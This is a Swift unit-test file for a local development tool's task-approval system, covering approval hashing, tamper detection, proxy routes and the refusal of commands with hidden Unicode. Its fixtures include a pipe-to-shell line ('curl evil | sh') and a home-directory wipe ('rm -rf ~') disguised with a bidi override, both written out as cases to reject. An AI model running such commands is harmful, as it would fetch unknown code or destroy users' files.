import XCTest
@testable import PaddockCore

/// What a site's approval means for what runs, how approvals are kept in state.json, and how task status
/// travels to clients.
final class TaskApprovalTests: XCTestCase {
    private let path = "/Users/me/Sites/shop"

    private func file(_ run: String = "php artisan queue:work", proxy: [String: Int] = [:]) -> SiteTasksFile {
        SiteTasksFile(tasks: ["queue": TaskDefinition(run: run, restartOnChange: nil, autostart: nil, stopSeconds: nil)],
                      proxy: proxy)
    }

    private func approved(_ file: SiteTasksFile, at sitePath: String? = nil) -> ApprovedTasks {
        ApprovedTasks(hash: file.hash, file: file, sitePath: sitePath ?? path, stopped: [])
    }

    // MARK: - Evaluation

    func testWithoutAnApprovalNothingRuns() {
        let current = file()
        let none = TaskApproval.evaluate(current: .none, approved: nil, sitePath: path)
        XCTAssertEqual(none.approval, .none)
        XCTAssertNil(none.running)

        let waiting = TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: nil, sitePath: path)
        XCTAssertEqual(waiting.approval, .needsApproval)
        XCTAssertNil(waiting.running, "nothing runs until approved")
        XCTAssertEqual(waiting.pending, current)

        let invalid = TaskApproval.evaluate(current: .invalid(reason: "it isn't valid JSON"), approved: nil, sitePath: path)
        XCTAssertEqual(invalid.approval, .invalid(reason: "it isn't valid JSON"))
        XCTAssertNil(invalid.running)

        let empty = SiteTasksFile(tasks: [:], proxy: [:])
        XCTAssertEqual(TaskApproval.evaluate(current: .file(empty, hash: empty.hash), approved: nil, sitePath: path).approval,
                       .none, "a file with nothing in it needs no approval")
    }

    func testAnApprovedFileRuns() {
        let current = file()
        let result = TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: approved(current),
                                           sitePath: path)
        XCTAssertEqual(result.approval, .approved)
        XCTAssertEqual(result.running, current)
        XCTAssertNil(result.pending)
    }

    /// A `git pull` that changes the file never changes what runs: the approved version keeps running.
    func testAChangedRemovedOrBrokenFileKeepsTheApprovedVersion() {
        let old = file("php artisan queue:work")
        let new = file("php artisan queue:work --tries=3")
        let changed = TaskApproval.evaluate(current: .file(new, hash: new.hash), approved: approved(old), sitePath: path)
        XCTAssertEqual(changed.approval, .changed)
        XCTAssertEqual(changed.running, old)
        XCTAssertEqual(changed.pending, new)

        let removed = TaskApproval.evaluate(current: .none, approved: approved(old), sitePath: path)
        XCTAssertEqual(removed.approval, .changed)
        XCTAssertEqual(removed.running, old)
        XCTAssertNil(removed.pending)

        let broken = TaskApproval.evaluate(current: .invalid(reason: "it isn't valid JSON"), approved: approved(old),
                                           sitePath: path)
        XCTAssertEqual(broken.approval, .changed)
        XCTAssertEqual(broken.running, old)
        XCTAssertEqual(broken.problem, "it isn't valid JSON")
    }

    /// An approval belongs to a folder: a site name that now points at another folder needs approving afresh.
    func testAnApprovalDoesNotFollowTheNameToAnotherFolder() {
        let current = file()
        let result = TaskApproval.evaluate(current: .file(current, hash: current.hash),
                                           approved: approved(current, at: "/Users/me/Other/shop"), sitePath: path)
        XCTAssertEqual(result.approval, .needsApproval)
        XCTAssertNil(result.running)
    }

    /// A stored approval whose definition doesn't hash to its hash (edited by hand, or from a canonical form this
    /// build doesn't know) approves nothing.
    func testATamperedOrUnknownApprovalApprovesNothing() {
        let current = file()
        let tampered = ApprovedTasks(hash: current.hash, file: file("curl evil | sh"), sitePath: path, stopped: [])
        XCTAssertFalse(tampered.isIntact)
        XCTAssertNil(TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: tampered,
                                           sitePath: path).running)
        let future = ApprovedTasks(hash: "v2:" + String(current.hash.dropFirst(3)), file: current, sitePath: path, stopped: [])
        XCTAssertFalse(future.isIntact)
        XCTAssertEqual(TaskApproval.evaluate(current: .file(current, hash: current.hash), approved: future,
                                             sitePath: path).approval, .needsApproval)
        let invalidStored = SiteTasksFile(tasks: ["Bad Name": TaskDefinition(run: "x", restartOnChange: nil, autostart: nil,
                                                                             stopSeconds: nil)], proxy: [:])
        XCTAssertFalse(ApprovedTasks(hash: invalidStored.hash, file: invalidStored, sitePath: path, stopped: []).isIntact,
                       "a stored definition must follow the same rules as the file")
    }

    // MARK: - Proxy routes

    /// Routes come only from an intact approval for the served site's very folder, and never to Paddock's own ports.
    func testRoutesComeOnlyFromApprovalsOfServedSites() throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("pdk-routes-\(UUID().uuidString.prefix(6))")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let real = try XCTUnwrap(SiteTasksFile.realPath(folder.path))
        let routed = file(proxy: ["/app": 8080, "/own": 18443])
        var state = State(parked: [])
        state.taskApprovals["shop"] = ApprovedTasks(hash: routed.hash, file: routed, sitePath: real, stopped: [])
        state.taskApprovals["moved"] = ApprovedTasks(hash: routed.hash, file: routed, sitePath: "/elsewhere", stopped: [])
        state.taskApprovals["tampered"] = ApprovedTasks(hash: "v1:nope", file: routed, sitePath: real, stopped: [])
        state.taskApprovals["unserved"] = ApprovedTasks(hash: routed.hash, file: routed, sitePath: real, stopped: [])
        let sites = ["shop", "moved", "tampered"].map {
            Site(name: $0, path: folder.path, kind: .linked, secured: true, php: PHPVersion("8.4")!, pinned: false)
        }
        XCTAssertEqual(TaskApproval.routes(state: state, sites: sites, reservedPorts: [18080, 18443, 53]),
                       ["shop": ["/app": 8080]])
    }

    // MARK: - Commands that can be shown

    func testOnlyCommandsThatShowAsTheyRunCanBeApproved() {
        XCTAssertTrue(Messages.isShowable("php artisan queue:work redis --queue=default,scout --tries=3"))
        XCTAssertTrue(Messages.isShowable("echo 'Café'  && bun run dev"), "precomposed letters and double spaces are fine")
        XCTAssertTrue(Messages.isShowable("a" + String(repeating: " ", count: 8) + "b"), "up to 8 spaces in a row")
        let hidden: [(String, String)] = [
            ("echo hi\u{1B}[2K", "an escape sequence"), ("a\tb", "a tab"), ("rm -rf ~\u{202E}", "a bidi override"),
            ("x\u{200B}y", "a zero-width space"), ("a\u{00A0}b", "a no-break space"), ("a\u{2003}b", "an em space"),
            ("a\u{7F}b", "DEL"), ("a\u{E000}b", "private use"),
            ("a\u{3164}b", "Hangul filler"), ("a\u{115F}b", "Hangul choseong filler"), ("a\u{1160}b", "Hangul jungseong filler"),
            ("a\u{FFA0}b", "halfwidth Hangul filler"), ("a\u{FE0F}b", "a variation selector"),
            ("a\u{034F}b", "combining grapheme joiner"), ("a\u{17B4}b", "Khmer inherent vowel"),
            ("a\u{2800}b", "braille blank"), ("e\u{0301}cho", "a combining accent"), ("a\u{20DD}b", "an enclosing mark"),
            ("a" + String(repeating: " ", count: 9) + "b", "9 spaces in a row"), (" echo", "a leading space"),
            ("echo ", "a trailing space"),
        ]
        for (command, what) in hidden {
            XCTAssertFalse(Messages.isShowable(command), what)
        }
    }

    /// A refusal says what the problem is: a character (by position, in Unicode scalars from 1, and code point),
    /// decomposed characters, a space at either end, or too many spaces in a row.
    func testTheRefusalSaysWhatIsWrong() {
        XCTAssertEqual(Messages.commandProblem(in: "ab\u{3164}c"), .character(position: 3, codePoint: 0x3164))
        XCTAssertEqual(Messages.commandProblem(in: "a\u{2028}b"), .character(position: 2, codePoint: 0x2028), "Zl")
        XCTAssertEqual(Messages.commandProblem(in: "a\u{2029}b"), .character(position: 2, codePoint: 0x2029), "Zp")
        XCTAssertEqual(Messages.commandProblem(in: "a\u{0378}b"), .character(position: 2, codePoint: 0x378), "unassigned")
        XCTAssertEqual(Messages.commandProblem(in: "a" + String(repeating: " ", count: 9) + "b"), .spaceRun(position: 10))
        XCTAssertEqual(Messages.commandProblem(in: "echo "), .edgeSpace)
        XCTAssertEqual(Messages.commandProblem(in: " echo"), .edgeSpace)
        XCTAssertEqual(Messages.commandProblem(in: "e\u{0301}cho"), .decomposed, "an accent typed separately")
        XCTAssertEqual(Messages.commandProblem(in: "x\u{20DD}"), .character(position: 2, codePoint: 0x20DD),
                       "a mark that is already NFC is still refused")
        XCTAssertNil(Messages.commandProblem(in: "echo 'Café' hi"))
        XCTAssertEqual(Messages.commandNotShowable(task: "queue", problem: .character(position: 3, codePoint: 0x3164)),
                       #"The command of task "queue" has a character that cannot be shown, at position 3 (U+3164), "#
                       + "so Paddock won't approve it. Make it plain text in paddock.json.")
        XCTAssertEqual(Messages.commandNotShowable(task: "queue", problem: .decomposed),
                       #"Paddock won't approve the command of task "queue". This command contains decomposed characters "#
                       + "(for example an accent typed separately). Retype that part.")
        XCTAssertEqual(Messages.commandNotShowable(task: "queue", problem: .edgeSpace),
                       #"Paddock won't approve the command of task "queue": it starts or ends with a space."#)
        XCTAssertEqual(Messages.commandNotShowable(task: "queue", problem: .spaceRun(position: 10)),
                       #"Paddock won't approve the command of task "queue": it has more than 8 spaces in a row at position 10."#)
    }

    /// The 2000-character limit counts Unicode scalars, and the command is at most 8000 bytes.
    func testTheLengthLimitCountsScalars() {
        let accented = String(repeating: "e\u{0301}", count: 1000)
        XCTAssertTrue(SiteTasksFile.isRunLine(accented), "2000 scalars (a file rule; showing it is another matter)")
        XCTAssertFalse(SiteTasksFile.isRunLine(accented + "x"), "2001 scalars, though only 1001 characters")
        XCTAssertTrue(SiteTasksFile.isRunLine(String(repeating: "😀", count: 2000)), "8000 bytes")
        let pending = SiteTasksStatus.pendingLines(SiteTasksFile(tasks: ["q": TaskDefinition(
            run: String(repeating: "a", count: 2000), restartOnChange: nil, autostart: nil, stopSeconds: nil)], proxy: [:]))
        XCTAssertEqual(pending.first?.runLength, 2000)
        XCTAssertEqual(pending.first?.run?.count, 2000, "shown whole")
    }

    // MARK: - state.json

    func testStateRoundTripsWithAndWithoutApprovals() throws {
        let empty = State(parked: ["/p"])
        XCTAssertEqual(try JSONDecoder().decode(State.self, from: JSONEncoder().encode(empty)), empty)
        XCTAssertEqual(empty.taskApprovals, [:])

        var state = State(parked: ["/p"])
        var approval = approved(file(proxy: ["/app": 8080]))
        approval.stopped = ["queue"]
        approval.goneSince = Date(timeIntervalSince1970: 1_800_000_000)
        state.taskApprovals = ["shop": approval]
        let decoded = try JSONDecoder().decode(State.self, from: JSONEncoder().encode(state))
        XCTAssertEqual(decoded, state)
        XCTAssertTrue(decoded.taskApprovals["shop"]?.isIntact ?? false)
    }

    func testOlderStateFilesAndBrokenApprovalsDecode() throws {
        let older = #"{"parked": ["/p"], "links": {}, "secured": [], "phpPins": {}}"#
        XCTAssertEqual(try JSONDecoder().decode(State.self, from: Data(older.utf8)).taskApprovals, [:])
        let current = file()
        let good = String(decoding: try JSONEncoder().encode(approved(current)), as: UTF8.self)
        let mixed = #"{"parked": [], "links": {}, "secured": [], "phpPins": {}, "taskApprovals": {"#
            + #""shop": "# + good + #", "broken": {"hash": 5}}}"#
        let decoded = try JSONDecoder().decode(State.self, from: Data(mixed.utf8))
        XCTAssertEqual(Array(decoded.taskApprovals.keys), ["shop"], "one unreadable approval never costs the state file")
        let minimal = #"{"hash": "\#(current.hash)", "file": {"tasks": {"queue": {"run": "php artisan queue:work"}}}, "sitePath": "/x"}"#
        let approval = try JSONDecoder().decode(ApprovedTasks.self, from: Data(minimal.utf8))
        XCTAssertEqual(approval.stopped, [])
        XCTAssertNil(approval.goneSince)
        XCTAssertTrue(approval.isIntact)
    }

    // MARK: - Status on the wire

    func testTaskStatusRoundTripsAndUnknownStatesFallBack() throws {
        let status = SiteTasksStatus(
            approval: .changed,
            tasks: [TaskStatus(name: "queue", run: "php artisan queue:work", state: .running(pid: 42), restartOnChange: true,
                               logPath: "/h/log/tasks/shop/queue.log", warning: nil),
                    TaskStatus(name: "once", run: "php artisan migrate", state: .stopped(reason: .exited),
                               restartOnChange: false, logPath: "/l", warning: "w"),
                    TaskStatus(name: "dup", run: "x", state: .alreadyRunning(pid: 7), restartOnChange: false, logPath: "/l",
                               warning: nil),
                    TaskStatus(name: "bad", run: "x", state: .crashed(reason: "r"), restartOnChange: false, logPath: "/l",
                               warning: nil)],
            pending: [PendingTask(name: "queue", run: "php artisan queue:work --tries=3", port: nil),
                      PendingTask(name: "/app", run: nil, port: 8080)],
            pendingHash: "v1:abc", notice: "n", routes: ["/app": 8080])
        XCTAssertEqual(try JSONDecoder().decode(SiteTasksStatus.self, from: JSONEncoder().encode(status)), status)
        for state in [TaskState.starting, .stopped(reason: nil), .stopped(reason: .byYou), .waitingForApproval] {
            XCTAssertEqual(try JSONDecoder().decode(TaskState.self, from: JSONEncoder().encode(state)), state)
        }
        XCTAssertEqual(try JSONDecoder().decode(TaskState.self, from: Data(#"{"hibernating": {}}"#.utf8)),
                       .crashed(reason: "unknown state"))
        XCTAssertEqual(try JSONDecoder().decode(TaskStopReason.self, from: Data(#""vacation""#.utf8)), .unknown)
        XCTAssertEqual(try JSONDecoder().decode(TaskApprovalState.self, from: Data(#"{"maybe": {}}"#.utf8)), .needsApproval,
                       "an approval state this build doesn't know never reads as approved")
        let sparse = try JSONDecoder().decode(SiteTasksStatus.self, from: Data(#"{"approval": {"approved": {}}}"#.utf8))
        XCTAssertEqual(sparse.tasks, [])
        XCTAssertEqual(sparse.pending, [])
        XCTAssertEqual(sparse.routes, [:], "routes from an older daemon: none")
    }

    func testASiteFromAnOlderDaemonHasNoTasksAndAnUnreadableTasksStatusIsDropped() throws {
        let older = #"{"name": "shop", "path": "/p", "kind": "parked", "secured": false, "php": "8.4", "pinned": false, "tld": "test"}"#
        let site = try JSONDecoder().decode(Site.self, from: Data(older.utf8))
        XCTAssertNil(site.tasks)
        let broken = #"{"name": "shop", "path": "/p", "kind": "parked", "secured": false, "php": "8.4", "pinned": false, "tld": "test", "tasks": 5}"#
        XCTAssertNil(try JSONDecoder().decode(Site.self, from: Data(broken.utf8)).tasks)
        var withTasks = site
        withTasks.tasks = SiteTasksStatus(approval: .needsApproval, tasks: [], pending: [], pendingHash: nil, notice: nil)
        XCTAssertEqual(try JSONDecoder().decode(Site.self, from: JSONEncoder().encode(withTasks)), withTasks)
    }

    func testTheBuildNumberMovesOn() {
        XCTAssertGreaterThanOrEqual(PaddockBuild.number, 9, "site tasks are in the status: the build number moves on")
        XCTAssertGreaterThanOrEqual(PaddockBuild.number, 12, "tasksStatus, forced restarts and new task states: it moves on")
        XCTAssertGreaterThanOrEqual(PaddockBuild.number, 13, "restart on change and listening warnings in the status")
        XCTAssertGreaterThanOrEqual(PaddockBuild.number, 14, "proxy routes in the status")
    }
}
